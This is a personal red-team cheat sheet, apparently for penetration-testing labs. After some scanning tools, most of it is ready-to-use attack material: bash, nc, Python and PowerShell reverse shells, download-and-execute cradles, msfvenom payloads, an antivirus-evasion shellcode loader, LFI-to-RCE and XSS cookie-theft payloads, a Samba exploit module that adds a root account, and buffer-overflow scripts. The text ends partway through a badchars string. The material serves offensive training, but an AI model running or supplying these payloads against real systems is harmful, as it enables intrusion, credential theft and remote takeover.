# My Red Team Notes

--------------------------------------

## Enumerate

### Initial Scan

#### **Nmap**

This tool use for initial scan.
UDP protocol and OS scan need<font color=#FF0000> **root** </font>permission.

* Usage
```
nmap {options} {IP}
```
* Options
  - Package Type -
    - `-sT` TCP scan
    - `-sU` UDP scan
    - `-sS` SYN scan
  - Detail Infomation -
    - `-sC` Default script
    - `-sV` Service version
  - Scan Speed -
    - `-T0` Very very slow speed
    - `-T1` Very slow speed
    - `-T2` Slow speed
    - `-T3` Normal speed
    - `-T4` Fast speed
    - `-T5` Fucking Fast
  - Special -
    - `-O` OS version
    - `-A` All enumerate
    - `-Pn` No ping
    - `-p-` All ports
    - `-o {file}` Output file
    - `-p {PORT}` Specify port
    - `--script {scripts}` Use nse scripts
* Scripts
```
Vuln              vuln
rmi-*             Java RMI All
POP3              pop3-ntlm-info
POP3              pop3-capabilities
SMB Users         smb-enum-users
SMB Share         smb-enum-shares
ShellShock        http-shellshock
SMB Version       smb-os-discovery
Oracle Version    oracle-tns-version
SMB CVE-2017-7494 smb-vuln-cve-2017-7494
```
* SMB
```
nmap -p 139,445 --script "smb-enum-shares,smb-os-discovery,smb-vuln-cve-2017-7494,smb-enum-users" --script-args smb-vuln-cve-2017-7494.check-version {IP} -o nmap_smb-version.sc
```
* ShellShock
```
nmap {IP} -p {PORT} --script=http-shellshock --script-args uri=/cgi-bin/{FILE_NAME}.cgi -o nmap_ShellShock.sc
```
* POP3
```
nmap -sV -p {PORT} --script "pop3-capabilities or pop3-ntlm-info" {IP} -o nmap_POP3.sc
```
- DNS Brute Force
```
nmap --dns-servers {DNS-Server} -p53 --script=dns-brute dns-brute.domain={domain} {IP} -e tun0
```
* Example Command
```
nmap -sC -sV 192.168.0.1 -o nmap_TCP.sc
```
* SOP

Nmap initial scan
```
nmap -sC -sV {IP} -o nmap_TCP.sc
nmap -T4 -p- {IP} -o nmap_full.sc
nmap --script vuln {IP} -o nmap_full.sc
sudo nmap -O {IP} -o nmap_OS.sc
sudo nmap -sU {IP} -o nmap_UDP.sc
```
* Install
```
sudo apt install nmap
```
* Binary File
  - [nmap.tar.gz](https://github.com/ernw/static-toolbox/releases)
    - Run run-nmap.sh as nmap

-----

#### **Rustscan**

Faster port scan tool

- Usage
```
rustscan {flags} {oprtions} {addresses} {command}
```
- Flags
    - `--no-nmap` NO nmap
    - `--top` Top 1000 ports
- Options
    - `-b {num}` The batch size for port scanning
    - `-p {port}` Scan choose ports
    - `-t {minisec}` Timeout
- Args
    - Addresses
        - A list of comma separated IP
    - Command
        - Nmap options
- Install
    - https://github.com/RustScan/RustScan
    - `sudo dpkg -i {package}`

-----

#### **nmapAutomator**

Enumeration whole family bucket



-----

### Web

#### **Dirsearch**

This tool use for website path scan.
Need<font color=#FF0000> **root** </font>permission.

- Usage
```
sudo python3 dirsearch.py {options} -u {URL}
```
- Options
    - `-u` Website URL
    - `-w` Wordlist
    - `-o {file}` Output file
    - `-e {extension},{extension}` Add file extension before wordlist
    - `--suffixes={path}` Add suffixes before URL
- Example Command
```
sudo python3 dirsearch.py -u http://example.com -o dirsearch.sc
```
- Download
    - [Dirsearch](https://github.com/maurosoria/dirsearch)
- SOP
```
sudo python3 dirsearch.py -u {URL} -o dirsearch.sc
```

-----

#### **FFUF**

This tool use for enumerate subdomain of website.

* Usage
```
ffuf {options}
```
* Options
  - `-c` Colorize output
  - `-w` Wordlist
  - `-u` URL
  - `-H` Header need to change
  - `-fs` Fillter HTTP response size
* Example Command
```
ffuf -c -w subdomains-top1million-20000.txt -u http://www.example.com -H "Host: FUZZ.example.com"
```
* Download
  - [FFUF](https://github.com/ffuf/ffuf)
* SOP
```
ffuf -c -w subdomains-top1million-20000.txt -u {URL} -H "Host: FUZZ.{URL}" -o subdomain.sc
```

-----

### CMS

#### **WPscan**

This tool use for enumerate wordpress CMS.

* Usage
```
wpscan {options}
```
- Options
    - `--url` URL
    - `-o {file}` Output file
    - `--disable-tls-checks` Disable TLS check (SSL)
    - `--usernames {username}` Brute force 
    - `--passwords {wordlist}` Dependency `--username`
    - `--plugins-detection {value}` Detection plugins
        - `mixed` Mixed
        - `passive` Passive
        - `aggressive` Aggressive
    - `--enumerate {value}` Enumerate the wordpress
        - `u` Users
        - `ap` All Plugins
        - `at` All Themes
        - `cb` Config backups
        - `dbe` DB exports
* Example Command
```
wpscan --url http://192.168.0.1 --enumerate u,ap,at,cb,dbe --plugins-detection aggressive -t 30 -o wpscan.sc
```
* SOP
```
wpscan --url {URL} --enumerate u,ap,at,cb,dbe --plugins-detection aggressive -t 30 -o wpscan.sc
```
* Install
```
sudo apt install wpscan
```

-----

### SMB

#### **enum4linux-ng**

This tool used for enumerate SMB service.

* Usage
```
python3 enum4linux-ng.py {options} {IP}
```
* Options
  - `-A` All scan
  - `-u {user_name}` User
  - `-oY {output_file}` Output file
* Example Command
```
python3 enum4linux-ng.py -A 192.168.0.1 -oY enum4linux.sc
```
* SOP
```
python3 enum4linux-ng.py -A {IP} -oY enum4linux.sc
python3 enum4linux-ng.py -A -u {user} -oY enum4linux_{user}.sc
```
* Download
  - [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)

-----

## Shell

### Linux Shell

- Find File
    - `find  / -iname {file_name} -print 2>/dev/null`
	- `du -a 2>/dev/null | grep {file_name}`
	- `tar cf - $PWD 2>/dev/null | tar tvf - | grep {file_name}`
- Sort File
    - `sort {file} | uniq > {output}`

-----

### Windows Shell

- Bypass execution policy
    - `powershell -ep bypass`
- List all data
	- `dir /a`
- Short name
	- `dir /x` 
- Find File
    - `dir {file_name} /s /p`
- Enable RDP
```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=yes
```
- Add User To RDP Group
```
net localgroup "Remote Desktop Users" "{USER_NAME}" /add
```

-----

### Tools

#### **msfvenom**

This tool used for spawn a reverse shell of execute file.

* Usage
```
msfvenom {options} LHSOT={IP} LPORT={PORT}
```
* Options
  - `-i {counts}` Encoder counts
  - `-p {payload}` Choose payload
  - `-a {x86/x64}` x86 or x64
  - `-e {encoder}` Obfuscate shellcode
  - `-f {file_type}` Spawn file type
  - `-b "{badchars}"` Remove badchars
  - `-o {output_file}` Output file
  - `EXITFUNC={value}` Process status
    - `thread` Common use
    - `process` Dependency handler
* Payload
  - Windows
    - `windows/meterpreter/reverse_tcp`
    - `windows/shell_reverse_tcp`
  - Linux
    - `linux/x86/meterpreter/reverse_tcp`
    - `linux/x86/shell_reverse_tcp`
  - Common
    - `java/shell_reverse_tcp` Only raw
* Encoder
  - x86
    - `x86/shikata_ga_nai`
    - `x86/call4_dword_xor`
  - x64
    - `x64/xor_context`
    - `x64/xor_dynamic`
* File Type
  - Execution file
    - `exe` Windows
    - `elf` Linux 
  - Buffer overflow
    - `c` C type
    - `python` Python type
  - Webshell
    - `aspx` For IIS
    - `asp` For IIS
    - `raw` For Tomcat
  - Special
    - `js_le` For js
    - `msi` For registry
* Windows Reverse Shell Execution File
```
msfvenom -p windows/shell_reverse_tcp -a x86 -e x86/shikata_ga_nai -i 3 LHOST={IP} LPORT={PORT} -f exe -o shell.exe
```
* Linux Reverse Shell Execution File
```
msfvenom -p linux/x86/shell_reverse_tcp -a x86 -e x86/shikata_ga_nai -i 3 LHOST={IP} LPORT={PORT} -f elf -o shell
```
* Buffer Overflow Windows
```
msfvenom -p windows/shell_reverse_tcp -a x86 -e x86/shikata_ga_nai -i 3 EXITFUNC=thread LHOST={IP} LPORT={PORT} -f python
```
* Microsoft IIS Webshell
```
msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f aspx -o shell.aspx
```
* Tomcat JSP Webshell
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST={IP} LPORT={PORT} -f raw -o shell.jsp
```
* JS Shellcode
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST={IP} LPORT={Port} CMD=/bin/bash -f js_le -e generic/none
```

-----

#### **Netcat**

This tool is very useful of connection target and attacker.

* Usage
```
nc {options} {IP} {PORT}
```
* Options
  - `-n` Use IP address
  - `-l` Listen mode
  - `-v` Details
  - `-p {PORT}` Port
* Example Command

Connection
```
nc -nv 192.168.0.1 9999
```
Listen
```
nc -lvnp 443
```
* Binary File
  - [nc ELF](https://github.com/H74N/netcat-binaries)
  - [nc EXE](https://github.com/int0x33/nc.exe/)

-----

#### **Reverse-SSH**

This tool use for create a stable connection of attacker and target.

* Usage
```
reverse-sshx86 {options} {IP}
```
* Options
  - `-l` Listen mode
  - `-v` Details
  - `-p {PORT}` Port
  - `--reverse` Reverse mode
* Example Command

Attacker
```
reverse-sshx86 -l -v -p 443 --reverse
```
Target
```
reverse-sshx86 -p 443 192.168.0.1
```
* Download
  - [reverse-ssh](https://github.com/Fahrj/reverse-ssh)

-----

### WebShell

* **PHP**
  - `<?php system("{command}"); ?>`
  - Bypass Disable Function
    - `shell_exec("{command}");`
    - `passthru("{command}")`
    - `exec("{command}");`
    - [shell.php](https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/shell.php)
    - [windows webshell](https://github.com/Dhayalanb/windows-php-reverse-shell)
  - Check Disable Function
    - `<?php phpinfo(); ?>`
    - `<?php var_dump(ini_get('disable_functions')); ?>`

-----

### Shell Upgrade

Python
```
python3 -c "import pty;pty.spawn('/bin/bash')" 
```
Perl
```
perl -e 'exec "/bin/bash";'
```

-----

### Reverse Shell - Linux

#### **Bash**
```
bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261%27
```

#### **nc**

With -e
```
nc -e /bin/bash {IP} {PORT}
```

Without -e
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {IP} {PORT} >/tmp/f
```

#### **Python**

```
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' &
```

#### **msfvenom**
```
msfvenom -p linux/x86/shell_reverse_tcp -a x86 -e x86/shikata_ga_nai -i 3 LHOST={IP} LPORT={PORT} -f elf -o shell
```

##### [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

-----

### Reverse Shell - Windows

#### **Powershell**

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

#### **Invoke-PowerShellTcp.ps1**

```
powershell iex (New-Object Net.WebClient).DownloadString('http://{IP}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}
```
* Download
  - [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

-----

### Special Reverse Shell

Perl File
```
#!/usr/bin/perl -w
use Socket;
$i="IP";
$p=PORT;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
open(STDOUT,">&S");
open(STDERR,">&S");
exec("cmd.exe");
};
```

-----

### File Transmission - Linux

* HTTP
  - Attacker
    - `python3 -m http.server 80`
  - Target
    - `wget http://{IP}/{file}`
    - `curl http://{IP}/{file} -o {file}`
* Netcat
  - Attacker
    - `nc -lvnp {PORT} > {file}`
  - Target
    - `nc -nv {IP} {PORT} < {file}`
* /dev/tcp
  - Attacker
    - `nc -lvnp {PORT} > {file}`
  - Target
    - `cat {file} > /dev/tcp/{IP}/{PORT}`

-----

### File Transmission - Windows

- HTTP
	- Attacker
		- `python3 -m http.server 80`
	- Target
        - `certutil -urlcache -f {URL} {File_name}`
* PowerShell Download Commands
```
powershell wget -UseBasicParsing http://<IP>:<Port>/<Filename> -OutFile %temp%/<Filename>

powershell -c "Invoke-WebRequest -Uri 'http://{IP}/{FileName}' -OutFile '%temp%\{FileName}'" 

powershell iex (New-Object Net.WebClient).DownloadString('http://{IP}/{Filename}')

powershell "(New-Object System.Net.WebClient).Downloadfile('http://<IP>:<Port>/<Filename>','<Filename>')"
```
- SMB
  - Attacker
    - `impacket-smbserver meow . -smb2support`
  - Target
    - `copy \\{IP}\meow\{file} {file}`
- https://blog.ropnop.com/transferring-files-from-kali-to-windows/

-----

### Bypass AV

- Shellter
    - Auto Mode : A
    - PE Target : `{whoami.exe}`
    - Stealth mode : N
    - Custom : C
    - Payload : `{raw_file}`
        - `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -e x86/shikata_ga_nai -f raw -o {FILE}.raw`
    - DLL Loader : N
- meow.exe
    - Use vscode to compile `CTRL + SHIFT + B`
    - Change tasks.json task name
        - tasks.json
         ```json=
         {
            "version": "2.0.0",
            "tasks": [
              {
                "label": "build hello world",
                "type": "shell",
                "command": "g++",
                "args": ["-g", "-o", "test_local", "test_local.cpp"],
                "group": {
                  "kind": "build",
                  "isDefault": true
                }
              }
            ]
          }
         ```
- Souce Code
```c=
#include "Windows.h"

int main()
{
    unsigned char meow[] = 
        // msfvenom -p windows/shell_reverse_tcp -a x86 -e x86/shikata_ga_nai -i 3 LHOST={IP} LPORT=443 -f c

      void *exec = VirtualAlloc(0, sizeof meow, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      memcpy(exec, meow, sizeof meow);
      ((void(*)())exec)();

    return 0;
}
```

-----

## Exploit

### Web

#### **curl**

This tool use to connect website and send request.

- Usage
```
curl {options} {URL}
```
- Options
    - `-X` Choose HTTP Medhod
    - `-i` Show Response Header
    - `-H` Add header in package
    - `-b` Add cookie in package
    - `-d` Add HTTP POST data
- Example Command
```
curl -X POST -H 'User-Agent: meow' -b 'sd8657s43dft5' "http://192.168.0.1"
```
- Form type
    - `Content-Type: application/x-www-form-urlencoded`
- Install
```
sudo apt install curl
```

-----

#### LFI

- Basic LFI
    - `../../../../../etc/passwd`
    - `%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Epasswd`
    - `....//....//....//....//....//etc/passwd`
    - `....\/....\/....\/....\/etc\/passwd`
    - `' and die(show_source('/etc/passwd')) or '`
        - If this payload can be execute. Then we can do code execution.
        - `'and system('id') or '`
- Sensitive File
    - Linux
        - `.htaccess`
        - `config.php`
        - `/etc/passwd`
        - `/etc/shadow`
        - `/etc/issue`
        - `/etc/motd`
        - `/etc/mtab`
        - `/etc/group`
        - `/etc/inetd.conf`
        - `/etc/resolv.conf`
        - `~/.bash_history`
        - `/var/log/dmessage`
        - `$USER/.bash_history`
        - `$USER/.ssh/id_rsa`
        - `$USER/.ssh/id_rsa.pub`
        - `/etc/httpd/conf/httpd.conf`
        - `$USER/.ssh/authorized_keys`
        - `/root/.bash_history`
        - `/root/.ssh/id_rsa`
        - `/proc/sched_debug`
        - `/proc/mounts`
        - `/proc/version`
        - `/proc/self/environ`
    - Windows
        - `C:\windows\repair\SAM`
        - `%SYSTEMROOT%\repair\SAM`
        - `%SYSTEMROOT%\repair\system`
        - `%SYSTEMROOT%\System32\config\SAM`
        - `%SYSTEMROOT%\System32\config\SYSTEM`
        - `%SYSTEMROOT%\System32\config\RegBack\SAM`
        - `%SYSTEMROOT%\System32\config\RegBack\system`
        - `C:\WINDOWS\system32\eula.txt`
        - `C:\boot.ini`
        - `C:\WINNT\win.ini`
        - `C:\WINNT\php.ini`
        - `C:\WINDOWS\win.ini`
        - `C:\WINDOWS\php.ini`
        - `C:\Program Files\Apache Group\Apache\conf\httpd.conf `
        - `C:\Program Files\Apache Group\Apache2\conf\httpd.conf`
        - `C:\Program Files\xampp\apache\conf\httpd.conf`
        - `C:\php\php.ini`
        - `C:\php4\php.ini`
        - `C:\php5\php.ini`
        - `C:\apache\php\php.ini`
        - `C:\xampp\apache\bin\php.ini`
        - `C:\home\bin\stable\apache\php.ini`
        - `C:\home2\bin\stable\apache\php.ini`
- Default Log Path
    - Apache (Linux)
        - `/var/log/access_log`
        - `/var/log/auth.log`
        - `/var/log/httpd/access_log`
        - `/var/log/apache/access_log `
        - `/var/log/apache2/access_log`
        - `/var/www/logs/access_log`
        - `/etc/httpd/logs/access_log`
        - `/usr/local/apache/logs/access_ log`
    - Apache (Windows)
        - `C:\Program Files\Apache Group\Apache\logs\access.log`
        - `C:\Program Files\Apache Group\Apache\logs\error.log`
    - Xampp
        - `C:\xampp\apache\logs\access.log`
        - `C:\xampp\apache\logs\error.log`
    - IIS
        - `C:\WINDOWS\system32\Logfiles`
        - `%SystemDrive%\inetpub\logs\LogFiles`
    - Nginx
        - `/usr/local/nginx/logs`
        - `/opt/nginx/logs/access.log`
- Log Poisin
    - If auth.log can be LFI
        - `ssh '<?php system($_GET["meow"])?>'@{IP}`
- User-Agent Poisoning
    - If `/proc/self/environ` can be read
    - `User-Agent : {webshell}`
    - https://www.youtube.com/watch?v=ttTVNcPnsJY
- Encode File
    - `php://filter/convert.base64-encode/resource={target}.php`
- Default Session Path
    - `/var/lib/php/sessions/sess_{sess_name}`
- LFI to RCE
    - Log Poisoning
        - Try LFI read the log file
        - `http://{IP}/<?php system("{command}");?>.html`
        - Read log file to trigger RCE
  - One Line
    - `http://{IP}/{target}?file=data:text/plain,<?php echo system("{command}");>`
  - LFI_2_RCE.py
```python
import grequests
sess_name = 'meowmeow'
sess_path = f'/var/lib/php/sessions/sess_{sess_name}'
base_url = 'http://{IP}/{PATH}'
param = "?p=source&file="

# code = "file_put_contents('/tmp/shell.php','<?php system($_GET[a])');"
code = '''system("bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'");'''

while True:
    req = [grequests.post(base_url,
                          files={'f': "A"*0xffff},
                          data={'PHP_SESSION_UPLOAD_PROGRESS': f"pwned:<?php {code} ?>"},
                          cookies={'PHPSESSID': sess_name}),
           grequests.get(f"{base_url}?{param}={sess_path}")]

    result = grequests.map(req)
    if "pwned" in result[1].text:
        print(result[1].text)
        break
```
- https://blog.stevenyu.tw/2022/05/07/advanced-local-file-inclusion-2-rce-in-2022/
- https://highon.coffee/blog/lfi-cheat-sheet/
- https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html

-----

#### RFI

- One Line
    - `http://{IP}/{target}?{value}=http://{IP}/shell.php`

-----

#### Command Injection

- Bypass Check
    - URL Encode
    - Special Encode Bypass
        - `%00` = ` `
        - `%0d%0a` = `\r\n`

-----

#### Upload Bypass

- File extension
    - [File extension wordlist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
- File Type
    - Change `application/x-php` to `image/png`
- File Header
    - Change `<?php phpinfo();?>` to `GIF89a<?php phpinfo();?>`
    - hexeditor
        - JPEG `FF D8 FF DB`
        - GIF `47 49 46 38 39 61`

-----

#### ShellShock

- One Line
    - `User-Agent : () { :;}; {command}`

-----

#### XSS

- Basic Payload
`<script>alert(1)</script>`
- Steal Cookie
    - `<script>new Image().src="http://{IP}:{PORT}/"+document.cookie</script>`
- Exploit
    - `<script>window.location.replace("http://{IP}/payload")</script>` 

-----

#### XXE

- Payload
```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```
- https://www.digicentre.com.tw/industry_detail.php?id=38

-----

#### User-Agent Forgery

* `curl -H "User-Agent: {user_agnet}" http://{IP}`
  * User-Agent
    * `Googlebot`

-----

### SMB

- Smb to Shell
    - `winexe -U '{username}' //{IP} cmd.exe`
    - `impacket-smbexec '{username}:{password}'@{ip}`
    - `impacket-psexec {username}:{password}'@{ip}`
- Check version
    - Open Wireshark
        - `smbclient -N -L "//{IP}/" --option='client min protocol=nt1'`
    - Metasploit
        - `scanner/smb/smb_version`

-----

#### CVE-2017-7494 SambaCry
- https://github.com/joxeankoret/CVE-2017-7494
    - `python2 cve_2017_7494.py -t {IP} --custom command.so`
    - `gcc -o command.so -shared command.c -fPIC`
        - ```C=
          #include <stdio.h>
          #include <unistd.h>
          #include <netinet/in.h>
          #include <sys/types.h>
          #include <sys/socket.h>
          #include <stdlib.h>
          #include <sys/stat.h>
          int samba_init_module(void)
            {
              setresuid(0,0,0); 
              system("echo root1:yeDupmFJ8ut/w:0:0:root:/root:/bin/bash >> /etc/passwd");
              return 0;
            }
              ```

-----

#### MS17-010

* Metasploit
  - `exploit/windows/smb/ms17_010_eternalblue`
* [Github MS17-010](https://github.com/helviojunior/MS17-010)
  - Normal
    - Prepare shell.exe
    - Run `checker.py` check pipes
    - Run `send_and_execute.py`
  - If no reply
    - Run `zzz_exploit.py`, change `smb_pwn` function
    - `service_exec(conn,r'cmd /c {command}')`

-----

#### Symlink Directory Traversal ( < 3.4.5)
- Tested on 3.0.24
    - https://github.com/roughiz/Symlink-Directory-Traversal-smb-manually

-----

#### Samba 2.2.x - Remote Buffer Overflow
- Tested on 2.2.7a
    - https://www.exploit-db.com/exploits/7

-----

### POP3

- JAMES POP3 Server 2.3.2
    - Change payload
    - https://www.exploit-db.com/exploits/35513
- Dump
    - `PGPASSWORD="{PASSWORD}" pg_dump {DB_NAME} > test.dump`

-----

### NFS
* Show Mount
  - `showmount -e {IP}`
* Mount
  - `sudo mount -t nfs {IP}:{share} /tmp/mount -nolock`
  - `sudo mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs`
  - `sudo mount -t nfs localhost:/ /tmp/meow`
* Privilege Esclaction
  - `cp /bin/bash {PATH}`
  - `sudo chown root bash`
  - `sudo chmod +x bash`
  - `sudo chmod +s bash`
  - `bash -p`

-----

### FTP

#### Home FTP

- [Home FTP Server 1.12 - Directory Traversal](https://www.exploit-db.com/exploits/16259)
- [Home FTP File Download](https://webcache.googleusercontent.com/search?q=cache:92M05_e2PYcJ:https://github.com/BuddhaLabs/PacketStorm-Exploits/blob/master/0911-exploits/homeftpserver-traversal.txt+&cd=4&hl=zh-TW&ct=clnk&gl=tw&client=firefox-b-d)
- FileZilla
    - Default password location
        - `C:\Program Files\FileZilla Server\FileZilla Server.xml`
        - `C:\Program Files(x86)\FileZilla Server\FileZilla Server.xml`

-----

### MySQL

- User-Defined Function (UDF) Dynamic Library
    - `SHOW VARIABLES LIKE 'plugin_dir';`
        - Check plugin dir
    - Compile
        - `gcc -g -c raptor_udf2.c -fPIC`
        - `gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`
    - Write File Method (1)
        - `use mysql;`
        - `create table hack(line blob);`
        - `insert into hack values(load_file('/tmp/lib_sys_udf.so'));`
            - File From https://github.com/zinzloun/MySQL-UDF-PrivEsc (https://www.exploit-db.com/exploits/1518)
        - `select * from hack into dumpfile '/{plugin_dir}/lib_sys_udf.so';`
    - Write File Method (2)
        - `xxd -p -c 9999999 lib_sys_udf.so`
        - `SET @SHELL=0x{.....}`
        - `SHOW VARIABLES LIKE 'plugin_dir';`
        - `SELECT BINARY @SHELL INTO DUMPFILE '{PLUGIN_DIR}/meow.so';`
    - `create function do_system returns integer soname 'lib_sys_udf.so';`
    - `select do_system("{command}");`
        - Not show return

-----

### CMS

#### Wordpress

* Enumerate User
  - `http://{IP}/index.php/?author=1`
* 404.php Path
  - `/wp-content/themes/<theme name>/404.php`
* Plugins Path
  - `/wp-content/plugins/{plugin_name}`
* Password DB
  - `SELECT concat(user_login,":",user_pass) FROM wp_users;`
* Config file (DB pass)
  - `wp-config.php`
* Plugin Webshell
```
wget https://raw.githubusercontent.com/jckhmr/simpletools/master/wonderfulwebshell/wonderfulwebshell.php
zip wonderfulwebshell.zip wonderfulwebshell.php
```
Upload and enable.
`http://{IP}/wp-content/plugins/wonderfulwebshell/wonderfulwebshell.php?cmd={command}`

-----

#### IIS

* Default Web root Path
  - `C:\inetpub\wwwroot`
* IIS 6.0
  - [CVE-2017-7269](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269)
    - Can only run once!!

-----

#### Tomcat

* Tomcat Path
  - `/manager/status/all`
  - `/admin/dashboard`
* Path Bypass
  - With `/..;/`
    - e.g. `/manager/status/..;/html/upload`
* Brute Force
  - Metasploit
    - `scanner/http/tomcat_mgr_login`
  - Hydra
```
hydra -L  /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt -f {IP} -s {PORT} http-get /manager/html
```

-----

#### Werkzeug

- Debug Page RCE
    - https://github.com/its-arun/Werkzeug-Debug-RCE

-----

#### Advanced Comment System 1.0
 * CVE-2009-4623
   * RFI
     * `/advanced_comment_system/index.php?ACS_path=http://{IP}/`
     * `/advanced_comment_system/admin.php?ACS_path=http://{IP}/`
   * Rename shell.php to config.php
   * https://www.exploit-db.com/exploits/9623

-----

#### Adobe ColdFusion 8

* CVE-2010-2861
  * LFI
    * `http://{IP}/{PATH}/CFIDE/administrator/enter.cfm?locale={LFI}`
    * Password Path
      * `../../../../../../../../../../ColdFusion8/lib/password.properties%00en`
  * https://www.exploit-db.com/exploits/14641

-----

#### Otrs 5

* CVE-2017-16921
  - Go to `/otrs/index.pl?Action=AdminSysConfig;Subaction=Edit;SysConfigSubGroup=Crypt%3A%3APGP;SysConfigGroup=Framework`
  - Set PGP enable
  - Set PGP::Bin `/bin/bash`
  - Set PGP::Options `-c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'`
  - Save Change
  - Go to `/index.pl?Action=AdminPGP`
  - https://www.exploit-db.com/exploits/43853

-----

#### HFS 2.3

* CVE-2014-6287
  * `python2 {IP} {PORT}`
  * Set lhost and lport
  * https://www.exploit-db.com/exploits/39161
* [49584.py](https://www.exploit-db.com/exploits/49584)
  * Change IP information in exploit,and you will get reverse shell of powershell.
  * https://www.exploit-db.com/exploits/49584 

-----

### Buffer Overflow

#### Commands

* Mona
  * Find Modules
    * `!mona modules`
  * Find Strings
    * `!mona find -s "\xff\xe4" -m "{modules}"`
* nasm_shell.rb
  * `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`
* JMP ESP
  * `\xff\xe4`

#### Fuzzing

[fuzzing.py]()

```python=                
#!/usr/bin/python2
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
        try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                print("Fuzzing username with %s bytes") % len(buffer)
                s.connect(('{IP}',{PORT}))
                s.recv(1024)
                s.send(buffer)
                sleep(1)
                s.close()
                buffer = buffer + "A"*100

        except:
                print "Error connecting to server"
                sys.exit()
```

-----

#### Offset

[offset.py]()

```python=
#!/usr/bin/python2
import sys, socket

#/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <value>
offset = "{offset}"

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('{IP}',{port}))
        s.recv(1024)
        s.send(offset)
        s.close()

except:
        print "Error connecting to server"
        sys.exit()
```

-----

#### Write EIP

[writing_EIP.py]()

```python=
#!/usr/bin/python2
import sys, socket

payload = "A" * {offset} + "B" * 4

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('{IP}',{PORT}))
        s.recv(1024)
        s.send(payload)
        s.close()

except:
        print "Error connecting to server"
        sys.exit()
```

-----

#### Badchars

[badchars.py]()

```python=
#!/usr/bin/python2
import sys, socket

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
